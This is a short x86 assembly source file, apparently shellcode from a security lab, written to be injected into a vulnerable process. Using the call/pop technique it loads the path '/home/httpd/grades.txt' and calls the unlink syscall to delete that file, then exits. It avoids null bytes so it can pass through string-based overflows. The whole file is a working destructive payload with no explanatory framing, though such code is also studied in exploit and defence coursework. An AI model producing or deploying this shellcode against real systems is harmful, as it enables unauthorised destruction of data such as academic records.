#include <sys/syscall.h>

#define STRING	"/home/httpd/grades.txt"
#define STRLEN	22
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
	movl	%eax,(ENVP)(%esi)	/* set up null envp */

	movb	$10 ,%al		/* syscall arg 0: syscall number */
	movl	%esi,%ebx		/* syscall arg 1: string pathname */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 1: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 0: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING
